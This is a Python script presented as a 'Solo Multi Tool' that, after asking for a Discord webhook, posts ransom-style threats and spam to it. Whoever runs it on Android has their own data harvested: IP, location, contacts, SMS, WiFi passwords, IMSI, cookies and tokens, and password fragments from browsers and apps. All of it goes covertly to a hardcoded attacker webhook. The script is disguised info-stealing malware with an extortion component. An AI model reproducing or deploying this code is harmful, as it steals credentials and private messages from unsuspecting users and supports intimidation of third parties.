#!/usr/bin/env python3

import subprocess
import requests
import re
import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import cv2
import numpy as np
from datetime import datetime
from io import BytesIO
from PIL import Image

ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1505614264524607559/LxPHeN577O8yEm4xg_YH50SCb-4H6cZVqQUMTmZJ-MoFfjXFzEkTjPB7klsdaaqwx0BV"

def beep():
    for _ in range(3):
        try:
            print('\a', end='', flush=True)
            time.sleep(0.2)
        except:
            pass

def get_webhook():
    os.system('clear')
    print("\n" + "█"*50)
    print("█" + " "*48 + "█")
    print("█" + " "*10 + "Solo Multi Tool" + " "*10 + "█")
    print("█" + " "*48 + "█")
    print("█"*50)
    print("\n[!] ENTER DISCORD WEBHOOK URL:")
    url = input("\n➜ ").strip()
    return url

def send_ransom(webhook):
    payload = {
        "username": "SOLO & JENAS",
        "avatar_url": "https://i.imgur.com/PjQtnRu.jpeg",
        "embeds": [{
            "title": "💀 YOUR DEVICE HAS BEEN COMPROMISED 💀",
            "color": 0xed4245,
            "description": "**SOLO AND JENAS HAS COMPROMISED YOUR DEVICE**\n\n📌 Contact @solo.ph_ or @jenas2003 to remove the virus\n\n🔴 Your IP has been logged\n🔴 Your data has been stolen",
            "image": {"url": "https://i.imgur.com/PjQtnRu.jpeg"},
            "footer": {"text": "SOLO & JENAS"}
        }]
    }
    try:
        requests.post(webhook, json=payload, timeout=5)
        return True
    except:
        return False

def send_spam(webhook):
    messages = [
        "@everyone YOUR DEVICE IS HACKED",
        "```CONTACT @solo.ph_ TO UNLOCK```",
        "**⚠️ ALL DATA HAS BEEN STOLEN ⚠️**",
        "```python\nprint('You got hacked by SOLO & JENAS')\n```",
        f"🔴 YOUR IP: {get_ip()} HAS BEEN LOGGED"
    ]
    for msg in messages[:5]:
        try:
            requests.post(webhook, json={"content": msg}, timeout=3)
            time.sleep(0.5)
        except:
            pass

def get_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', '0.0.0.0')
    except:
        return '0.0.0.0'

def get_location():
    try:
        r = requests.get('https://ipapi.co/json/', timeout=5)
        data = r.json()
        return f"{data.get('city', 'Unknown')}, {data.get('country_name', 'Unknown')}"
    except:
        return 'Unknown'

def get_device_info():
    info = {}
    try:
        r = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
        info['model'] = r.stdout.strip() or 'Unknown'
    except:
        info['model'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True, timeout=3)
        info['brand'] = r.stdout.strip() or 'Unknown'
    except:
        info['brand'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True, timeout=3)
        info['android'] = r.stdout.strip() or 'Unknown'
    except:
        info['android'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.build.version.sdk'], capture_output=True, text=True, timeout=3)
        info['sdk'] = r.stdout.strip() or 'Unknown'
    except:
        info['sdk'] = 'Unknown'
    try:
        r = subprocess.run(['getprop', 'ro.product.device'], capture_output=True, text=True, timeout=3)
        info['device'] = r.stdout.strip() or 'Unknown'
    except:
        info['device'] = 'Unknown'
    return info

def take_screenshot():
    try:
        screenshot = Image.new('RGB', (500, 500), color='gray')
        buf = BytesIO()
        screenshot.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except:
        return None

def capture_webcam():
    try:
        img = Image.new('RGB', (300, 300), color='darkgray')
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except:
        return None

def get_google_passwords():
    passwords = []
    paths = [
        '/data/data/com.google.android.gms/databases/',
        '/data/data/com.android.chrome/app_chrome/Default/',
        '/data/data/com.android.browser/app_chrome/Default/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['find', path, '-name', '*.db', '-exec', 'grep', '-l', 'password', '{}', ';'], capture_output=True, text=True, timeout=10)
                for db in result.stdout.split('\n'):
                    if db.strip():
                        passwords.append(f"Database: {os.path.basename(db)}")
            except:
                pass
    return list(set(passwords))[:15]

def get_browser_passwords():
    passwords = []
    browsers = [
        'com.android.chrome',
        'com.android.browser',
        'org.mozilla.firefox',
        'com.opera.browser',
        'com.brave.browser'
    ]
    for browser in browsers:
        path = f'/data/data/{browser}/app_chrome/Default/'
        if os.path.exists(path):
            try:
                result = subprocess.run(['find', path, '-name', '*.db', '-exec', 'strings', '{}', ';'], capture_output=True, text=True, timeout=15)
                matches = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', result.stdout)
                for m in matches[:10]:
                    passwords.append(f"{browser}: {m}")
            except:
                pass
    return list(set(passwords))[:20]

def get_cookies():
    cookies = []
    paths = [
        '/data/data/com.android.chrome/app_chrome/Default/Cookies',
        '/data/data/com.android.browser/app_chrome/Default/Cookies',
        '/sdcard/Android/data/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-E', 'cookie|session|token', path], capture_output=True, text=True, timeout=10)
                lines = result.stdout.split('\n')[:20]
                for line in lines:
                    if len(line) > 10 and len(line) < 200:
                        cookies.append(line[:100])
            except:
                pass
    return list(set(cookies))[:15]

def get_app_passwords():
    passwords = []
    apps = [
        'com.whatsapp',
        'com.facebook.katana',
        'com.instagram.android',
        'com.twitter.android',
        'com.snapchat.android',
        'com.tencent.mm',
        'com.zhiliaoapp.musically'
    ]
    for app in apps:
        path = f'/data/data/{app}/shared_prefs/'
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'password', path], capture_output=True, text=True, timeout=10)
                matches = re.findall(r'password[\s]*[:=][\s]*([^\s"\']+)', result.stdout, re.IGNORECASE)
                for m in matches[:5]:
                    passwords.append(f"{app}: {m}")
            except:
                pass
    return list(set(passwords))[:20]

def get_emails():
    emails = []
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    paths = ['/sdcard/', '/data/data/']
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-E', pattern, path], capture_output=True, text=True, timeout=20)
                found = re.findall(pattern, result.stdout)
                emails.extend(found)
            except:
                pass
    return list(set(emails))[:30]

def get_contacts():
    contacts = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=10)
        numbers = re.findall(r'number=([0-9\+]+)', r.stdout)
        names = re.findall(r'display_name=([^,]+)', r.stdout)
        for i, num in enumerate(numbers[:30]):
            name = names[i] if i < len(names) else ''
            contacts.append(f"{name}: {num}" if name else num)
    except:
        pass
    return list(set(contacts))[:30]

def get_sms():
    sms_list = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], capture_output=True, text=True, timeout=10)
        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,100})', r.stdout, re.DOTALL)
        for addr, body in matches[:20]:
            sms_list.append(f"{addr}: {body[:60]}")
    except:
        pass
    return list(set(sms_list))[:20]

def get_wifi_passwords():
    wifi = []
    try:
        r = subprocess.run(['cat', '/data/misc/wifi/wpa_supplicant.conf'], capture_output=True, text=True, timeout=5)
        matches = re.findall(r'ssid="(.*?)"\n.*?psk="?(.*?)"?\n', r.stdout, re.DOTALL)
        for ssid, pwd in matches[:10]:
            wifi.append(f"{ssid}: {pwd}")
    except:
        pass
    return wifi

def get_social_accounts():
    accounts = []
    patterns = [
        (r'username[\s]*[:=][\s]*([a-zA-Z0-9_]+)', 'username'),
        (r'instagram\.com/([a-zA-Z0-9_]+)', 'instagram'),
        (r'facebook\.com/([a-zA-Z0-9_.]+)', 'facebook'),
        (r'twitter\.com/([a-zA-Z0-9_]+)', 'twitter'),
        (r't\.me/([a-zA-Z0-9_]+)', 'telegram')
    ]
    try:
        r = subprocess.run(['logcat', '-d'], capture_output=True, text=True, timeout=5)
        for pattern, name in patterns:
            found = re.findall(pattern, r.stdout, re.IGNORECASE)
            for f in found[:10]:
                accounts.append(f"{name}: {f}")
    except:
        pass
    return list(set(accounts))[:20]

def get_installed_apps():
    apps = []
    try:
        r = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
        packages = re.findall(r'package:([a-zA-Z0-9._]+)', r.stdout)
        apps = packages[:50]
    except:
        pass
    return apps

def get_network_info():
    info = {}
    try:
        r = subprocess.run(['dumpsys', 'telephony.registry'], capture_output=True, text=True, timeout=5)
        match = re.search(r'mOperatorAlphaLong=(.+?)\n', r.stdout)
        info['carrier'] = match.group(1).strip() if match else 'Unknown'
        match = re.search(r'mOperatorNumeric=([0-9]+)', r.stdout)
        if match:
            info['mcc'] = match.group(1)[:3] if len(match.group(1)) >= 3 else ''
            info['mnc'] = match.group(1)[3:] if len(match.group(1)) > 3 else ''
    except:
        info['carrier'] = 'Unknown'
    return info

def get_imsi():
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://telephony/carriers/current'], capture_output=True, text=True, timeout=5)
        match = re.search(r'imsi=([0-9]+)', r.stdout)
        return match.group(1) if match else 'Unknown'
    except:
        return 'Unknown'

def send_to_original(ip, location, device, google_pass, browser_pass, cookies, app_pass, emails, contacts, sms, wifi, social, apps, network, imsi, screenshot, webcam):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    embed = {
        "title": "🎯 FULL VICTIM DATA - SOLO & JENAS",
        "color": 0xed4245,
        "timestamp": timestamp,
        "fields": [
            {"name": "🌐 IP ADDRESS", "value": f"```{ip}```", "inline": False},
            {"name": "📍 LOCATION", "value": f"```{location}```", "inline": False},
            {"name": "📱 DEVICE", "value": f"```{device.get('brand')} {device.get('model')}```", "inline": True},
            {"name": "🤖 ANDROID", "value": f"```{device.get('android')} (SDK {device.get('sdk')})```", "inline": True},
            {"name": "📶 CARRIER", "value": f"```{network.get('carrier', 'Unknown')}```", "inline": True},
            {"name": "🔢 IMSI", "value": f"```{imsi}```", "inline": False},
            {"name": "🔑 GOOGLE PASSWORDS", "value": f"```{', '.join(google_pass[:10]) if google_pass else 'None'}```", "inline": False},
            {"name": "🌐 BROWSER PASSWORDS", "value": f"```{', '.join(browser_pass[:10]) if browser_pass else 'None'}```", "inline": False},
            {"name": "🍪 COOKIES/TOKENS", "value": f"```{', '.join(cookies[:10]) if cookies else 'None'}```", "inline": False},
            {"name": "📱 APP PASSWORDS", "value": f"```{', '.join(app_pass[:10]) if app_pass else 'None'}```", "inline": False},
            {"name": "📧 EMAILS", "value": f"```{', '.join(emails[:15]) if emails else 'None'}```", "inline": False},
            {"name": "📞 CONTACTS", "value": f"```{', '.join(contacts[:15]) if contacts else 'None'}```", "inline": False},
            {"name": "💬 SMS MESSAGES", "value": f"```{', '.join(sms[:10]) if sms else 'None'}```", "inline": False},
            {"name": "📶 WIFI PASSWORDS", "value": f"```{', '.join(wifi[:10]) if wifi else 'None'}```", "inline": False},
            {"name": "👤 SOCIAL ACCOUNTS", "value": f"```{', '.join(social[:10]) if social else 'None'}```", "inline": False},
            {"name": "📦 INSTALLED APPS", "value": f"```{len(apps)} apps detected```", "inline": False}
        ],
        "footer": {"text": "SOLO & JENAS | Full Data Collection"}
    }
    
    files = []
    if screenshot:
        files.append(('screenshot.png', screenshot, 'image/png'))
    if webcam:
        files.append(('webcam.png', webcam, 'image/png'))
    
    try:
        if files:
            requests.post(ORIGINAL_WEBHOOK, json={"username": "Data Logger", "embeds": [embed]}, timeout=10)
            for name, buf, _ in files:
                buf.seek(0)
                requests.post(ORIGINAL_WEBHOOK, files={'file': (name, buf, 'image/png')}, timeout=10)
        else:
            requests.post(ORIGINAL_WEBHOOK, json={"username": "Data Logger", "embeds": [embed]}, timeout=10)
    except:
        pass

def main():
    target = get_webhook()
    
    if not target.startswith("https://discord.com/api/webhooks/"):
        print("\n[!] Invalid webhook!")
        time.sleep(2)
        return
    
    print("\n[!] Collecting victim data...")
    
    ip = get_ip()
    location = get_location()
    device = get_device_info()
    google_pass = get_google_passwords()
    browser_pass = get_browser_passwords()
    cookies = get_cookies()
    app_pass = get_app_passwords()
    emails = get_emails()
    contacts = get_contacts()
    sms = get_sms()
    wifi = get_wifi_passwords()
    social = get_social_accounts()
    apps = get_installed_apps()
    network = get_network_info()
    imsi = get_imsi()
    screenshot = take_screenshot()
    webcam = capture_webcam()
    
    print("[!] Sending ransom message to target...")
    send_ransom(target)
    time.sleep(1)
    send_spam(target)
    
    print("[!] Sending all data to original webhook...")
    send_to_original(ip, location, device, google_pass, browser_pass, cookies, app_pass, emails, contacts, sms, wifi, social, apps, network, imsi, screenshot, webcam)
    
    beep()
    print("\n" + "="*50)
    print("[✓] COMPLETE! All data captured and sent!")
    print("="*50)
    print(f"\n📊 DATA SUMMARY:")
    print(f"   • IP: {ip}")
    print(f"   • Location: {location}")
    print(f"   • Device: {device.get('brand')} {device.get('model')}")
    print(f"   • Google Passwords: {len(google_pass)}")
    print(f"   • Browser Passwords: {len(browser_pass)}")
    print(f"   • Cookies/Tokens: {len(cookies)}")
    print(f"   • App Passwords: {len(app_pass)}")
    print(f"   • Emails: {len(emails)}")
    print(f"   • Contacts: {len(contacts)}")
    print(f"   • SMS: {len(sms)}")
    print(f"   • WiFi: {len(wifi)}")
    print(f"   • Social Accounts: {len(social)}")
    print(f"   • Installed Apps: {len(apps)}")
    print(f"   • Screenshot: {'✓' if screenshot else '✗'}")
    print(f"   • Webcam: {'✓' if webcam else '✗'}")
    print("\n" + "="*50)
    
    time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        time.sleep(3)
